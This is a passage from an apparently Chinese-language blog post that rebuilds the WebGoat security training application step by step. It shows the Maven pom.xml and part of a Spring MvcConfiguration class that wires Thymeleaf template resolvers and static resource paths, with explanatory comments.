<p>pom.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>MyWebGoat<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.2.3-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>MyWebGoat<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>MyWebGoat<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--        被继承的父项目的构件表示符--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--        被继承的父项目全球唯一标识符--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--        被继承的父项目的版本--&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>17<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.reporting.outputEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.reporting.outputEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">spring-boot.version</span>&gt;</span>2.6.6<span class="tag">&lt;/<span class="name">spring-boot.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.junit.vintage<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit-vintage-engine<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-jpa<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.security<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-security-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.6.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.20<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-undertow<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--跟tomcat一样，也是一个web服务器。--&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-tomcat<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.hsqldb<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hsqldb<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--        自动化管理Webdriver驱动文件--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring-boot.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">source</span>&gt;</span>16<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">target</span>&gt;</span>16<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">encoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">encoding</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.7.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>com.wanan.webgoat.server.StartWebGoat<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">id</span>&gt;</span>repackage<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>repackage<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220702210331524.png" alt="image-20220702210331524"></p>
<h1 id="container-1"><a href="#container-1" class="headerlink" title="container"></a>container</h1><h2 id="MvcConfiguration"><a href="#MvcConfiguration" class="headerlink" title="MvcConfiguration"></a>MvcConfiguration</h2><p>这里我们初始时没有添加thymeleaf模板引擎,所以访问会爆500错误,因此我们需要添加上去</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220703162250649.png" alt="image-20220703162250649"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220703161328196.png" alt="image-20220703161328196"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220703162353426.png" alt="image-20220703162353426"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220704171709746.png" alt="image-20220704171709746"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.i18n.Language;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.i18n.Messages;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.i18n.PluginMessages;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.LessonScanner;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.LabelDebugger;</span><br><span class="line"><span class="keyword">import</span> lombok.RequiredArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.ResourceLoader;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.support.ResourcePatternResolver;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.LocaleResolver;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ViewResolver;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.ResourceHandlerRegistration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.ResourceHandlerRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.ViewControllerRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.i18n.SessionLocaleResolver;</span><br><span class="line"><span class="keyword">import</span> org.thymeleaf.IEngineConfiguration;</span><br><span class="line"><span class="keyword">import</span> org.thymeleaf.extras.springsecurity5.dialect.SpringSecurityDialect;</span><br><span class="line"><span class="keyword">import</span> org.thymeleaf.spring5.SpringTemplateEngine;</span><br><span class="line"><span class="keyword">import</span> org.thymeleaf.spring5.templateresolver.SpringResourceTemplateResolver;</span><br><span class="line"><span class="keyword">import</span> org.thymeleaf.spring5.view.ThymeleafViewResolver;</span><br><span class="line"><span class="keyword">import</span> org.thymeleaf.templatemode.TemplateMode;</span><br><span class="line"><span class="keyword">import</span> org.thymeleaf.templateresolver.FileTemplateResolver;</span><br><span class="line"><span class="keyword">import</span> org.thymeleaf.templateresolver.ITemplateResolver;</span><br><span class="line"><span class="keyword">import</span> org.thymeleaf.templateresolver.StringTemplateResolver;</span><br><span class="line"><span class="keyword">import</span> org.thymeleaf.templateresource.ITemplateResource;</span><br><span class="line"><span class="keyword">import</span> org.thymeleaf.templateresource.StringTemplateResource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="comment">//注解类</span></span><br><span class="line"><span class="meta">@RequiredArgsConstructor</span></span><br><span class="line"><span class="comment">//写在类上可以代替@Autowired注解，需要注意的是在注入时需要用final定义，或者使用@notnull注解</span></span><br><span class="line"><span class="comment">//@Autowired 注释添加到需要该类型数组的字段或方法，则 Spring 会从ApplicationContext 中搜寻符合指定类型的所有 bean</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MvcConfiguration</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">UTF8</span> <span class="operator">=</span> <span class="string">&quot;UTF-8&quot;</span>;</span><br><span class="line"><span class="comment">//    定义字符集</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> LessonScanner lessonScanner;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addViewControllers</span><span class="params">(ViewControllerRegistry registry)</span> &#123;</span><br><span class="line">        registry.addViewController(<span class="string">&quot;/login&quot;</span>).setViewName(<span class="string">&quot;login&quot;</span>);</span><br><span class="line">        registry.addViewController(<span class="string">&quot;/lesson_content&quot;</span>).setViewName(<span class="string">&quot;lesson_content&quot;</span>);</span><br><span class="line">        registry.addViewController(<span class="string">&quot;/start.mvc&quot;</span>).setViewName(<span class="string">&quot;main_new&quot;</span>);</span><br><span class="line">        registry.addViewController(<span class="string">&quot;/scoreboard&quot;</span>).setViewName(<span class="string">&quot;scoreboard&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> ViewResolver <span class="title function_">viewResolver</span><span class="params">(SpringTemplateEngine thymeleafTemplateEngine)</span>&#123;</span><br><span class="line">        <span class="type">ThymeleafViewResolver</span> <span class="variable">resolver</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThymeleafViewResolver</span>();</span><br><span class="line">        resolver.setTemplateEngine(thymeleafTemplateEngine);</span><br><span class="line"><span class="comment">//        设置模板引擎是thymeleafTemplateEngine</span></span><br><span class="line">        resolver.setCharacterEncoding(StandardCharsets.UTF_8.displayName());</span><br><span class="line"><span class="comment">//        设置字符集utf-8</span></span><br><span class="line">        <span class="keyword">return</span> resolver;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> ITemplateResolver <span class="title function_">lessonThymeleafTemplateResolver</span><span class="params">(ResourceLoader resourceLoader)</span>&#123;</span><br><span class="line"><span class="comment">//        大概就是获取一个模板解析器</span></span><br><span class="line">        <span class="type">var</span> <span class="variable">resolver</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileTemplateResolver</span>()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> ITemplateResource <span class="title function_">computeTemplateResource</span><span class="params">(IEngineConfiguration configuration, String ownerTemplate, String template, String resourceName, String characterEncoding, Map&lt;String ,Object&gt; templateResolutionAttributes)</span>&#123;</span><br><span class="line">                <span class="keyword">try</span>(<span class="type">var</span> <span class="variable">is</span> <span class="operator">=</span> resourceLoader.getResource(<span class="string">&quot;classpath:&quot;</span>+resourceName).getInputStream()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">StringTemplateResource</span>(<span class="keyword">new</span> <span class="title class_">String</span>(is.readAllBytes(),StandardCharsets.UTF_8));</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        resolver.setOrder(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//        设置解析器的执行顺序为1</span></span><br><span class="line">        <span class="keyword">return</span> resolver;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> ITemplateResolver <span class="title function_">springThymeleafTemplateResolver</span><span class="params">(ApplicationContext applicationContext)</span>&#123;</span><br><span class="line">        <span class="type">SpringResourceTemplateResolver</span> <span class="variable">resolver</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpringResourceTemplateResolver</span>();</span><br><span class="line">        resolver.setPrefix(<span class="string">&quot;classpath:/webgoat/templates/&quot;</span>);</span><br><span class="line"><span class="comment">//        设置模板文件的前缀</span></span><br><span class="line">        resolver.setSuffix(<span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="comment">//        设置模本文件的后缀</span></span><br><span class="line">        resolver.setTemplateMode(TemplateMode.HTML);</span><br><span class="line"><span class="comment">//        设置模本模型为html</span></span><br><span class="line">        resolver.setOrder(<span class="number">2</span>);</span><br><span class="line"><span class="comment">//        设置解析器的执行顺序为2</span></span><br><span class="line">        resolver.setCharacterEncoding(UTF8);</span><br><span class="line"><span class="comment">//        设置字符集</span></span><br><span class="line">        resolver.setApplicationContext(applicationContext);</span><br><span class="line">        <span class="keyword">return</span> resolver;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> LessonTemplateResolver <span class="title function_">LessonTemplateResolver</span><span class="params">(ResourceLoader resourceLoader)</span>&#123;</span><br><span class="line">        <span class="type">LessonTemplateResolver</span> <span class="variable">lessonTemplateResolver</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LessonTemplateResolver</span>(resourceLoader);</span><br><span class="line">        lessonTemplateResolver.setOrder(<span class="number">0</span>);</span><br><span class="line">        lessonTemplateResolver.setCacheable(<span class="literal">false</span>);</span><br><span class="line"><span class="comment">//        不启用缓存模式</span></span><br><span class="line">        lessonTemplateResolver.setCharacterEncoding(UTF8);</span><br><span class="line">        <span class="keyword">return</span> lessonTemplateResolver;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> AsciiDoctorTemplateResolver <span class="title function_">asciiDoctorTemplateResolver</span><span class="params">(ResourceLoader resourceLoader)</span>&#123;</span><br><span class="line">        <span class="type">AsciiDoctorTemplateResolver</span> <span class="variable">resolver</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AsciiDoctorTemplateResolver</span>(resourceLoader);</span><br><span class="line">        resolver.setCacheable(<span class="literal">false</span>);</span><br><span class="line">        resolver.setOrder(<span class="number">1</span>);</span><br><span class="line">        resolver.setCharacterEncoding(UTF8);</span><br><span class="line">        <span class="keyword">return</span> resolver;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SpringTemplateEngine <span class="title function_">thymeleafTemplateEngine</span><span class="params">(ITemplateResolver springThymeleafTemplateResolver,</span></span><br><span class="line"><span class="params">                                                        LessonTemplateResolver lessonTemplateResolver,</span></span><br><span class="line"><span class="params">                                                        AsciiDoctorTemplateResolver asciiDoctorTemplateResolver,</span></span><br><span class="line"><span class="params">                                                        ITemplateResolver lessonThymeleafTemplateResolver)</span>&#123;</span><br><span class="line">        <span class="type">SpringTemplateEngine</span> <span class="variable">engine</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpringTemplateEngine</span>();</span><br><span class="line">        engine.setEnableSpringELCompiler(<span class="literal">true</span>);</span><br><span class="line">        engine.addDialect(<span class="keyword">new</span> <span class="title class_">SpringSecurityDialect</span>());</span><br><span class="line">        engine.setTemplateResolvers(Set.of(lessonTemplateResolver, asciiDoctorTemplateResolver, lessonThymeleafTemplateResolver, springThymeleafTemplateResolver));</span><br><span class="line">        <span class="keyword">return</span> engine;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addResourceHandlers</span><span class="params">(ResourceHandlerRegistry registry)</span>&#123;</span><br><span class="line">        registry.addResourceHandler(<span class="string">&quot;/css/**&quot;</span>).addResourceLocations(<span class="string">&quot;classpath:/webgoat/static/css/&quot;</span>);</span><br><span class="line">        registry.addResourceHandler(<span class="string">&quot;/js/**&quot;</span>).addResourceLocations(<span class="string">&quot;classpath:/webgoat/static/js/&quot;</span>);</span><br><span class="line">        registry.addResourceHandler(<span class="string">&quot;/plugins/**&quot;</span>).addResourceLocations(<span class="string">&quot;classpath:/webgoat/static/plugins/&quot;</span>);</span><br><span class="line">        registry.addResourceHandler(<span class="string">&quot;/fonts/**&quot;</span>).addResourceLocations(<span class="string">&quot;classpath:/webgoat/static/fonts/&quot;</span>);</span><br><span class="line"><span class="comment">//        注册静态资源</span></span><br><span class="line"></span><br><span class="line">        registry.addResourceHandler(<span class="string">&quot;/images/**&quot;</span>).addResourceLocations(lessonScanner.applyPattern(<span class="string">&quot;classpath:/lessons/%s/images/&quot;</span>).toArray(String[]::<span class="keyword">new</span>));</span><br><span class="line">        registry.addResourceHandler(<span class="string">&quot;/lesson_js/**&quot;</span>).addResourceLocations(lessonScanner.applyPattern(<span class="string">&quot;classpath:/lessons/%s/js/&quot;</span>).toArray(String[]::<span class="keyword">new</span>));</span><br><span class="line">        registry.addResourceHandler(<span class="string">&quot;/lesson_css/**&quot;</span>).addResourceLocations(lessonScanner.applyPattern(<span class="string">&quot;classpath:/lessons/%s/css/&quot;</span>).toArray(String[]::<span class="keyword">new</span>));</span><br><span class="line">        registry.addResourceHandler(<span class="string">&quot;/lesson_templates/**&quot;</span>).addResourceLocations(lessonScanner.applyPattern(<span class="string">&quot;classpath:/lessons/%s/templates&quot;</span>).toArray(String[]::<span class="keyword">new</span>));</span><br><span class="line">        registry.addResourceHandler(<span class="string">&quot;/video/**&quot;</span>).addResourceLocations(lessonScanner.applyPattern(<span class="string">&quot;classpath:/lessons/%s/video&quot;</span>).toArray(String[]::<span class="keyword">new</span>));</span><br><span class="line"><span class="comment">//        注册lessons的静态资源</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> PluginMessages <span class="title function_">pluginMessages</span><span class="params">(Messages messages, Language language,</span></span><br><span class="line"><span class="params">                                         ResourcePatternResolver resourcePatternResolver)</span>&#123;</span><br><span class="line">        <span class="type">PluginMessages</span> <span class="variable">pluginMessages</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PluginMessages</span>(messages,language,resourcePatternResolver);</span><br><span class="line">        pluginMessages.setDefaultEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        pluginMessages.setBasename(<span class="string">&quot;i18n/WebGoatLables&quot;</span>);</span><br><span class="line">       